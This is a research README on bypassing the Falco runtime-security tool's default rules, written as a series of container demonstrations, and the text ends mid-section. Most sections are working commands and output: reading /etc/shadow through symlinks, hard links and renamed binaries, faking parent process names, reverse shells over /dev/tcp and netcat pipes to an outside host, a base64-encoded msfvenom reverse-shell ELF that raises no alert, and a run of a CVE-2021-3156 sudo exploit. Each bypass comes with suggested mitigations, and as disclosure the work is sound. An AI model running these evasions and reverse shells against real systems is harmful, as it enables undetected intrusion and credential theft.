This project describes my research on various techniques to bypass default falco ruleset (based on falco v0.28.1).

This is a research project that consists of documentation (all in `README.md`) and supporting artifacts placed in subdirectories.

The main directory contains the **Dockerfile** for `sshayb/fuber:latest` image used extensively in this project as well as the artifacts needed to successfully build the image. To build the image, run `docker build -t sshayb/fuber:latest .` from the main directory. This will download and copy the necessary binaries and fubers (from /fubers) into the container image based on ubuntu:18.04. The build process copies the binaries under different names and creates symlinks where necessary (see Dockerfile for details) - all this to avoid triggering rules from the moment the container starts. 

**Binaries** are docker and kubectl standalone binaries typically used to facilitate privilege escalation and lateral movement during the cluster compromise. **Fubers** are small bypass snippets written in C and used to demonstrate various bypass techniques: `fuber-openandreadfile` and `systemd-logind` are used in section [Bypass rules via executable naming](#naming), while `fuber-dos` is used in section [A Word on CVE-2019-8339 and Falco Denial of Service](#cve).

A separate **folder `CVE-2021-3156`** contains everything needed to build the docker image used to test CVE-2021-3156 vulnerability in section [A special case of "Sudo Potential Privilege Escalation"](#escalation): Dockerfile, exploit POC and a vulnerable sudo package.

## Falco Overview
Higher abstraction levels in Software and DevOps world have multiple advantages: they make software and configuration reuse easier; they facilitate code development and project creation. The price is the visibility. The higher the abstraction level the more difficult it is to monitor, inspect and debug it. Falco was born to solve this problem. As an ultimate "Wireshark" of Kubernetes, it can tell what process was spawned when and correlate this process to the workload on Kubernetes level. Falco's uniqueness is in the way it cuts through the abstraction levels and brings together multiple debug and monitor sources into the parsable and manageable environment.

### Falco skipped system calls

Before we proceed, we need to understand that because of the sheer volume of system events Falco cannot process all of them. The developers had to make a conscious decision to ignore the following system calls, which by itself is an interesting bypass vector:

```
access alarm brk capget clock_getres clock_gettime clock_nanosleep clock_settime close container cpu_hotplug drop epoll_create epoll_create1 epoll_ctl epoll_pwait epoll_wait eventfd eventfd2 exit_group fcntl fcntl64 fdatasync fgetxattr flistxattr fstat fstat64 fstatat64 fstatfs fstatfs64 fsync futex get_robust_list get_thread_area getcpu getcwd getdents getdents64 getegid geteuid getgid getgroups getitimer getpeername getpgid getpgrp getpid getppid getpriority getresgid getresuid getrlimit getrusage getsid getsockname getsockopt gettid gettimeofday getuid getxattr infra io_cancel io_destroy io_getevents io_setup io_submit ioprio_get ioprio_set k8s lgetxattr listxattr llistxattr llseek lseek lstat lstat64 madvise mesos mincore mlock mlockall mmap mmap2 mprotect mq_getsetattr mq_notify mq_timedreceive mq_timedsend mremap msgget msgrcv msgsnd munlock munlockall munmap nanosleep newfstatat newselect notification olduname page_fault pause poll ppoll pread pread64 preadv procinfo pselect6 pwrite pwrite64 pwritev read readv recv recvmmsg remap_file_pages rt_sigaction rt_sigpending rt_sigprocmask rt_sigsuspend rt_sigtimedwait sched_get_priority_max sched_get_priority_min sched_getaffinity sched_getparam sched_getscheduler sched_yield select semctl semget semop send sendfile sendfile64 sendmmsg setitimer setresgid setrlimit settimeofday sgetmask shutdown signaldeliver signalfd signalfd4 sigpending sigprocmask sigreturn splice stat stat64 statfs statfs64 switch sysdigevent tee time timer_create timer_delete timer_getoverrun timer_gettime timer_settime timerfd_create timerfd_gettime timerfd_settime times ugetrlimit umask uname ustat vmsplice wait4 waitid waitpid write writev
```

### Priorities
Every Falco rule must have an associated priority. According to Falco [documentation](https://falco.org/docs/rules/#rule-priorities), rule priority is a case-insensitive representation of the severity of the event. Can be one of the following: emergency, alert, critical, error, warning, notice, informational, debug. As of release 0.28.1, only the last 6 categories are used for default rules in falco_rules.yaml

## Previous Work on Falco Bypasses
This is not the first work on Falco bypasses. There were several projects before that focused on different bypass vectors:
- Sep 2019 - by [NCC Group](https://www.antitree.com/2019/09/container-runtime-security-bypasses-on-falco/) - focused on image name manipulations to leverage Falco rules allow-lists.
- August 2020 - by [Brad Geesaman](https://darkbit.io/blog/falco-rule-bypass) - similar to previous work, exploited weak image name comparison logic to leverage Falco rules allow-lists.
- Nov 2020 - by [Leonardo Di Donato](https://www.youtube.com/watch?v=nGqWskXRSmo) - exploited twin syscalls that Falco missed, suggested other ideas used in this report.
- June 2019 and ongoing - by [maintainers](https://github.com/falcosecurity/falco/issues/676) - ongoing issue handling the missing sister calls

## Bypass Techniques and Examples

### Bypass rules via symlink creation
**Read sensitive file untrusted** rule attempts to detect reads of sensitive files. In general, the more AND conditions the rule exhibits the more chances are there to find a bypass. This rule has over 15 top-level AND conditions with one of them being _sensitive_files_ which, in turn, boils down to the file name comparison. On the example of opening _/etc/shadow_ we get the following trigger:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@aaf107a41747:/# cat /etc/shadow
-----
[Falco]
22:16:00.785720133: Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=-1 program=cat command=cat /etc/shadow file=/etc/shadow parent=bash gparent=<NA> ggparent=<NA> gggparent=<NA> container_id=aaf107a41747 image=debian) k8s.ns=<NA> k8s.pod=<NA> container=aaf107a41747 k8s.ns=<NA> k8s.pod=<NA> container=aaf107a41747
```
Since Linux symlink is a type of file on its own, we can count on its unchanged representation in syscall arguments. This should trick the file name comparison condition: 
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@9f209b4c4b14:/# ln -s /etc/shadow sh-link
root@9f209b4c4b14:/# cat sh-link 
root:*:18291:0:99999:7:::
...
-----
[Falco]
15:10:39.646932303: Notice Symlinks created over senstivie files (user=root user_loginuid=-1 command=ln -s /etc/shadow sh-link target=/etc/shadow linkpath=/sh-link parent_process=bash) k8s.ns=<NA> k8s.pod=<NA> container=9f209b4c4b14 k8s.ns=<NA> k8s.pod=<NA> container=9f209b4c4b14
```
Leonardo in his [presentation](https://www.youtube.com/watch?v=nGqWskXRSmo) quickly mentions the symlink evasion for **Run shell untrusted** rule by "symlinking the shell binary", so this evasion is not new. The difference is in this case we are symlinking the event arguments. Perhaps it wouldn't be a big deal because really the creation of the symlink over the sensitive file triggers rule **Create Symlink Over Sensitive Files**. However, this new rule is merely a NOTICE, which comparing to previous WARNING leads to a detection downgrade.

But can we do better by eliminating the notice completely? The following will do the trick: creating the symlink to a non-sensitive subdirectory and then using a relative path:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@caddb1e39e70:/# ln -s /etc/security etcsecurity-link
root@caddb1e39e70:/# cat etcsecurity-link/../shadow
root:*:18291:0:99999:7:::
...
-----
[Falco]
SILENCE
```
The success of this bypass is conditioned on the ability to create a symlink to the non-monitored subdirectory within the sensitive directory. The described symlink bypass techniques can be lego pieces in bypassing other rules.

Similarly, we can bypass **Write below etc**, **Write below root** and other write detection rules that rely on directory path comparison:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@8a7dc959e480:/# echo "##" >> /etc/profile
root@8a7dc959e480:/# echo "##" >> /profile
-----
[Falco]
01:46:54.511510877: Error File below /etc opened for writing (user=root user_loginuid=-1 command=bash parent=<NA> pcmdline=<NA> file=/etc/profile program=bash gparent=<NA> ggparent=<NA> gggparent=<NA> container_id=8a7dc959e480 image=debian) k8s.ns=<NA> k8s.pod=<NA> container=8a7dc959e480 k8s.ns=<NA> k8s.pod=<NA> container=8a7dc959e480
01:47:02.638754876: Error File below / or /root opened for writing (user=root user_loginuid=-1 command=bash parent=<NA> file=/profile program=bash container_id=8a7dc959e480 image=debian) k8s.ns=<NA> k8s.pod=<NA> container=8a7dc959e480 k8s.ns=<NA> k8s.pod=<NA> container=8a7dc959e480
-----
[Container]
root@8a7dc959e480:/# ln -s / root-link
root@8a7dc959e480:/# echo "##" >> root-link/etc/profile
root@8a7dc959e480:/# echo "##" >> root-link/profile
-----
[Falco]
SILENCE
```

Another way to bypass symlink creation is by using a hard link (credit for this bypass goes to Stephen Clarke). Hard links are the often-overlooked sibling of the soft links; opposite to the soft links, they share the same inode with the target file along with the original permissions. The syscall used when creating a hard links is different from the syscall used when creating soft links, therefore, **Create Symlink Over Sensitive Files** remains silent:

```
[Container]
$ docker run --rm -it debian:10.2 bash
root@7777d3b8ddea:/tmp# ln /etc/shadow sh-link
root@7777d3b8ddea:/tmp# cat sh-link
root:*:18291:0:99999:7:::
...
-----
[Falco]
SILENCE
```

<ins>Rules bypassed:</ins> 
- **Read sensitive file untrusted**
- **Read sensitive file trusted after startup**
- **Create Symlink Over Sensitive Files**
- **Write below ...**
- other rules that depend on _fd.name_ or _fd.directory_ comparison

<ins>Suggested mitigations:</ins> Warnings on symlink creation; ability to detect symlink-relative paths; detecting link and linkat syscals for hard link creation.

### <a name="escalation"></a>A special case of "Sudo Potential Privilege Escalation"

**Sudo Potential Privilege Escalation** is designed to trigger an exploit attempt of recent CVE-2021-3156. To test this rule, I prepared a vulnerable container [image](CVE-2021-3156/Dockerfile) that contains the vulnerable _sudo_1.8.31-1ubuntu1_amd64_ package along with the python environment needed to run the exploit[^3]. As of the time of the rule creation there was no public exploit available and the same is stated in the Sysdig blog[^4] describing this rule. Therefore, it is an interesting exercise to test the rule against the real exploit. Unfortunately, the rule does not trigger:
```
[Container]
$ docker run -it sshayb/cve-2021-3156:latest bash
g00fb4ll@b042f8e202a5:~$ python exploit_nss.py 
# id
uid=0(root) gid=0(root) groups=0(root)
-----
[Falco]
SILENCE
```
To understand the reason behind the Falco silence I attached the container process to the strace utility. The following command captures only execve events and follows forks:
```
[Host]
$ sudo strace -p 14415 -f -e execve -v -s 250
strace: Process 14415 attached
strace: Process 16653 attached
[pid 16653] execve("/usr/bin/python", ["python", "exploit_nss.py"], ["HOSTNAME=b042f8e202a5", "PWD=/home/g00fb4ll", "HOME=/home/g00fb4ll", "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=0"..., "TERM=xterm", "SHLVL=1", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "_=/usr/bin/python"]) = 0
...
[pid 16653] execve("/usr/bin/sudo", ["sudoedit", "-A", "-s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\"], ["ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ...
[pid 16653] execve("/bin/sh", NULL, NULL) = 0
strace: Process 16670 attached
[pid 16670] execve("/usr/bin/id", ["id"], ["PWD=/home/g00fb4ll"]) = 0
[pid 16670] +++ exited with 0 +++
```
We can see from the line `execve("/usr/bin/sudo"...` that all the rule conditions are met (in fact, if we run `sudoedit -A -s ...` manually the rule triggers as expected). Digging deeper we see the discrepancy between the execve pathname and _argv[0]_. This only works because on the ubuntu base images _sudoedit_ is in fact a symlink to _sudo_. While _proc.name_ is parsed from the execve pathname (as per documentation[^5]: "the name (excluding the path) of the executable generating the event"), the rule censors _sudoedit_ process name. This discrepancy results in the rule not triggering with the underlying problem being the rule not considering the censored process name being a symlink. I recommend changing the rule to capture two possible process names and audit other rules that use symlinks in _proc.name_ conditions.

### <a name="naming"></a>Bypass rules via executable naming

Let us consider the same **Read sensitive file untrusted** rule again - is there another, non-symlink way to bypass the rule? This rule relies on the following condition: `and not proc.name in (user_mgmt_binaries,`, where _proc.name_ is (according to Falco documentation) "the name (excluding the path) of the executable generating the event". _user_mgmt_binaries_ macro, in turn, boils down to the following items list:
```
- list: login_binaries
  items: [
    login, systemd, '"(systemd)"', systemd-logind, su, nologin, faillog, lastlog, newgrp, sg]
```
We can check which one of those binaries does not exist in the container for the sake of no confusion and find _systemd-logind_ as a good candidate for diversion on our debian buster image. We write the simplest [file open C program](/fubers/fuber-openandreadfile.c) and compile it as a _systemd-logind_. Using this new binary, we can read sensitive files without tripping the Falco alarms:
```
[Host]
gcc fuber-openandreadfile.c -o systemd-logind
docker cp systemd-logind e35d7bc254a9:/tmp
----
[Container]
docker run --rm -it debian:10.2 bash
root@e35d7bc254a9:/# which systemd-logind
root@e35d7bc254a9:/# /tmp/systemd-logind /etc/shadow
root:*:18291:0:99999:7:::daemon:*:18291:0:99999:7:::bin:*:18291:0:99999:7:::sys:*:18291:0:99999:7:::sync:*:18291:0:99999:7:::games:*:18291:0:99999:7:::man:*:18291:0:99999:7:::lp:*:18291:0:99999:7:::mail:*:18291:0:99999:7:::news:*:18291:0:99999:7:::uucp:*:18291:0:99999:7:::proxy:*:18291:0:99999:7:::www-data:*:18291:0:99999:7:::backup:*:18291:0:99999:7:::list:*:18291:0:99999:7:::irc:*:18291:0:99999:7:::gnats:*:18291:0:99999:7:::nobody:*:18291:0:99999:7:::_apt:*:18291:0:99999:7:::root@e35d7bc254a9:/#
----
[Falco]
SILENCE
```
This bypass technique was also mentioned in the same Kubecon 2020 [presentation](https://www.youtube.com/watch?v=nGqWskXRSmo), but I believe it deserves more attention because of the ubiquitous nature of _proc.name_ construct. It appears over 140 times in the default ruleset structures and indeed many rules rely on the conditions involving _proc.name_ comparisons. Furthermore, the "and not" construct is very popular within the default ruleset as a means to avoid False Positives. In fact, most of the rules include some kind of "exception" list in one way or another.

If we think what rules can be bypassed through creation of custom binaries, it becomes apparent that the described approach is not scalable. For other malicious actions that incorporate events other than file/directory manipulations, writing a C program duplicating the functionality does not scale. Turns out, we do not have to duplicate the functionality. Merely creating the symlink named as one of the exception binaries should do the trick:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@4095c5a4eb4a:/# which cat
/bin/cat
root@4095c5a4eb4a:/# ln -s /bin/cat systemd-logind
root@4095c5a4eb4a:/# systemd-logind /etc/shadow
root@4095c5a4eb4a:/# ./systemd-logind /etc/shadow
root:*:18291:0:99999:7:::
...
-----
[Falco]
SILENCE
```

Finally, if the attacker has permission to rename or copy the binary at question then they can simply rename or copy it to one of the excepted binaries:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@a212547db36c:/# cp /bin/cat /tmp/systemd-logind
root@a212547db36c:/# /tmp/systemd-logind /etc/shadow
root:*:18291:0:99999:7:::
...
-----
[Falco]
SILENCE
```

These three sub-techniques give an attacker a powerful bypass for the rules that rely on _proc.name_ comparison.

<ins>Rules bypassed:</ins> All rules that rely on _proc.name_ comparison.

<ins>Suggested mitigations:</ins> Less reliance on _proc.name_.

### <a name="naming"></a>Bypass rules via parent / ancestor executable naming

A similar bypass can be done through the manipulation of the current process parents. Let us consider the same **Read sensitive file untrusted** rule again. One of the conditions for exception checks that this suspicious action is not performed by the _passwd_ command copying the sensitive file:

```
- macro: cmp_cp_by_passwd
  condition: proc.name in (cmp, cp) and proc.pname in (passwd, run-parts)
```

This gives us an idea to use _cp_ to copy the sensitive file while ensuring the parent process is called "passwd". This can be easily done by creating a simple bash script performing the necessary commands for us and naming it "passwd":

```
[Container]
$ sudo docker run -it sshayb/fuber:latest bash
root@7c8c49e59890:/tmp# cat passwd 
#!/bin/bash
cp /etc/shadow shadow-copy
root@7c8c49e59890:/tmp# chmod +x passwd
root@7c8c49e59890:/tmp# ./passwd 
root@7c8c49e59890:/tmp# ls
docker  fubers  gbash  gdocker  gkubectl  passwd  runc-nsenter  shadow-copy
root@7c8c49e59890:/tmp# cat shadow-copy
root:*:18759:0:99999:7:::
...
-----
[Falco]
SILENCE
```

In addition, _proc.aname_ construct can also be used for bypasses with _proc.aname[1]_ containing a parent process name, _proc.aname[2]_ containing a grandfather process name and so on. To make the process of bypassing easy we created a small utility that forks the process a necessary number of times and changes the process name at the required level. To bypass the same **Read sensitive file untrusted** we can use any of the handy exception conditions that check one of the ancestor names. For example, macro _run\_by\_google\_accounts\_daemon_:

```
- macro: run_by_google_accounts_daemon
  condition: >
    (proc.aname[1] startswith google_accounts or
     proc.aname[2] startswith google_accounts or
     proc.aname[3] startswith google_accounts)
```

To demonstrate the usage of the utility, for the first time we will use `sshayb/fuber:latest` - an ubuntu-based [image](Dockerfile) that was specifically built to contain necessary tools and utilities for this study[^2]:

```
[Container]
$ sudo docker run -it sshayb/fuber:latest
root@cc2c6682b811:/tmp# ./fubers/fuber-fakeparents "cat /etc/shadow" google_accounts 3
root:*:18831:0:99999:7:::
...
-----
[Falco]
SILENCE
```

In this example, fuber-fakeparents utility renames the current process to "google_accounts" and forks the process 3 times before calling _cat_. The impact of this bypass is significant - as of v0.30, there are 50 instances of _pname_ and 45 instances of _aname[*]_ usage in the conditional context.

<ins>Rules bypassed:</ins> All rules that rely on _proc.pname_ and _proc.aname_ comparison.

<ins>Suggested mitigations:</ins> Similar to previous bypass - less reliance on process naming.

### <a name="revshell"></a>Bypass reverse shell detection

Initiation of a reverse shell connection is a crucial ability for successful attack. Falco default ruleset contains several rules that make reverse shell detectable by default. Let us examine how Falco detects the typical reverse shell attempt initiated from within the compromised pod / container:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@e2305ecd8227:/# /bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
-----
[Host]
$ sudo nc -nlvp 443
[sudo] password for tutorial: 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:53782.
root@e2305ecd8227:/#
-----
[Falco]
02:14:04.303361864: Notice Known system binary sent/received network traffic (user=root user_loginuid=-1 command=bash -c bash -i >& /dev/tcp/172.17.0.1/443 0>&1 connection=172.17.0.2:53782->172.17.0.1:443 container_id=e2305ecd8227 image=debian) k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227 k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227
02:14:04.303403479: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227 process=bash parent=bash cmdline=bash -c bash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=e2305ecd8227 image=debian fd.name=172.17.0.2:53782->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227
02:14:04.303405119: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227 process=bash parent=bash cmdline=bash -c bash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=e2305ecd8227 image=debian fd.name=172.17.0.2:53782->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=e2305ecd8227
```
Getting rid of the first event is easy with the symlink to bash:
```
[Container]
$ docker run --rm -it debian:10.2 bash
root@3a03766368a0:/# which bash
/bin/bash
root@3a03766368a0:/# ln -s /bin/bash /tmp/gbash
root@3a03766368a0:/# /tmp/gbash -c "/tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1"
-----
[Host]
$ sudo nc -nlvp 443
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:48048.
root@3a03766368a0:/#
-----
[Falco]
14:44:37.439154946: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
14:44:37.439157224: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
```
Still, we have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triad. The first thought is swapping dup call with one of the sister calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.

Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. What about payloads that redirect shell to netcat through pipe creation?
```
[Container]
docker run --rm -it sshayb/fuber:latest
root@eabe8cffc8c8:/tmp# mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | /bin/nc 172.17.0.1 443 1>/tmp/backpipe
-----
[Host]
sudo nc -nlvp 443
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:43588.
hostname
eabe8cffc8c8
-----
[Falco]
12:47:37.884716967: Notice Network tool launched in container (user=root user_loginuid=-1 command=nc 172.17.0.1 443 parent_process=gbash container_id=eabe8cffc8c8 container_name=vigorous_hawking image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8 k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8
```
Great. This does not trigger "Redirect stdout/stdin" rule, and besides, getting rid of the "Network tool launched" is easy with the previous bypass techniques.

Finally, to be even more original and avoid triggering any rules without using previous bypasses, we can use the msfvenom tool, which is a de-facto standard payload generator in offensive security community:
```
[Kali]
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f elf | base64
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQ
AAAAAAAAailYmWoCX2oBXg8FSJdIuQIAAbusEQABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7
WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
-----
[Container]
root@3a03766368a0:/# echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIAAbusEQABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/gshell.elf
root@3a03766368a0:/# chmod +x /tmp/gshell.elf 
root@3a03766368a0:/# /tmp/gshell.elf
-----
[Host]
$ sudo nc -nlvp 443
[sudo] password for tutorial: 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:46326.
hostname
3a03766368a0
-----
[Falco]
SILENCE
``` 
<ins>Rules bypassed:</ins> **Redirect STDOUT/STDIN to Network Connection in Container**.

<ins>Suggested mitigations:</ins> Include dup2 and dup3 sister calls; create separate rule to detect msfvenom-generated payloads; create separate rule to detect mkfifo and mknod coupled with the usage of netcat.

### Bypass rules based on command arguments manipulation

Another standard way to initiate a reverse shell is through the usage of the netcat utility with executable parameters:
```
[Container]
$ docker run -it sshayb/fuber:latest bash
root@7917d5e18fd8:/tmp# nc 172.17.0.1 443 -e /bin/bash
-----
[Host]
[tutorial@osboxes ~]$ sudo nc -nlvp 443
[sudo] password for tutorial: 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:55110.
hostname
7917d5e18fd8
-----
[Falco]
19:19:39.456461463: Warning Netcat runs inside container that allows remote code execution (user=root user_loginuid=-1 command=nc 172.17.0.1 443 -e /bin/bash container_id=7917d5e18fd8 container_name=sleepy_mcclintock image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
19:19:39.460933949: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 process=nc parent=bash cmdline=nc 172.17.0.1 443 -e /bin/bash terminal=34816 container_id=7917d5e18fd8 image=sshayb/fuber fd.name=172.17.0.2:55110->172.17.0.1:443 fd.num=0 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
```
We have already bypassed the second triggered rule and it is trivial to bypass the **Netcat Remote Code Execution in Container** rule because it depends on _proc.name_ comparison. Still, symlinks and naming aside, we see another opportunity to bypass this rule.

One of the rule conditions relies on the comparison of command line parameters: `and (proc.args contains "-e" or proc.args contains "-c")`. While _-e_ and _-c_ flags are imperative for post-connect command execution, simple argument stapling will defeat the "contains" operator logic. Here, I use a verbosity flag for obfuscation:
```
[Container]
root@7917d5e18fd8:/tmp# nc 172.17.0.1 443 -ve "/bin/bash"
172.17.0.1: inverse host lookup failed: Unknown host
(UNKNOWN) [172.17.0.1] 443 (?) open
-----
[Host]
$ sudo nc -nlvp 443
[sudo] password for tutorial: 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:50084.
hostname
7917d5e18fd8
-----
[Falco]
19:52:03.184973672: Notice Network tool launched in container (user=root user_loginuid=-1 command=nc 172.17.0.1 443 -ve /bin/bash parent_process=bash container_id=7917d5e18fd8 container_name=sleepy_mcclintock image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
19:52:03.235157399: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 process=nc parent=bash cmdline=nc 172.17.0.1 443 -ve /bin/bash terminal=34816 container_id=7917d5e18fd8 image=sshayb/fuber fd.name=172.17.0.2:50084->172.17.0.1:443 fd.num=0 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
```
Even though Falco emits two events, the first rule is different now, which means we successfully bypassed **Netcat Remote Code Execution in Container**. Rule **Launch Suspicious Network Tool in Container** is of NOTICE priority (detection downgrade), relies on _proc.name_ comparison in `network_tool_binaries` list, and is therefore bypassable through traditional means. Among other things, this exercise points on Falco's correct logic to report the higher-priority event if multiple rules trigger as a result of the same call. But in the context of this discussion, the more important point is having another evasion technique on hand through collation of the command line arguments.

To understand how common the usage of command line parameters in the default ruleset is and whether we can use this technique to evade other rules we search for _proc.args_ constructs. There are four other rules that use _proc.args_ command in a meaningful way:
1. **Search Private Keys or Passwords**
2. **Delete Bash History** (deprecated)
3. **Sudo Potential Privilege Escalation**
4. **Mount Launched in Privileged Container** - through `mount_info` macro

**Search Private Keys or Passwords** uses _proc.args_ to detect searches for "id_rsa" and "id_dsa" private key files. Due to the expressiveness of find utility we can easily bypass the search through the usage of _-regex_ argument:
```
[Container]
[tutorial@osboxes falco-bypasses]$ docker run -it debian:10.2 bash
root@d0d423987b37:/# find / -name id_rsa
-----
[Falco]
00:11:41.762019106: Warning Grep private keys or passwords activities found (user=root user_loginuid=-1 command=find / -name id_rsa container_id=d0d423987b37 container_name=pedantic_easley image=debian:10.2) k8s.ns=<NA> k8s.pod=<NA> container=d0d423987b37 k8s.ns=<NA> k8s.pod=<NA> container=d0d423987b37
-----
[Container]
root@d0d423987b37:~/.ssh# find / -regex .*id_.sa$
/root/.ssh/id_rsa
-----
[Falco]
SILENCE
```
**Sudo Potential Privilege Escalation** is the rule detecting the very recent privilege escalation vulnerability in sudo package CVE-2021-3156. _proc.args_ is used to check for execution functionality flags in sudoedit:
```
[Container]
$ docker run -it sshayb/fuber:latest bash
root@018ccf061927:/tmp# useradd g00fb4ll
root@018ccf061927:/tmp# su g00fb4ll
$ sudoedit -s '\' 'id'
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout]
                [-u user] file ...
$ sudoedit -i '\' 'id'
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout]
                [-u user] file ...
-----
[Falco]
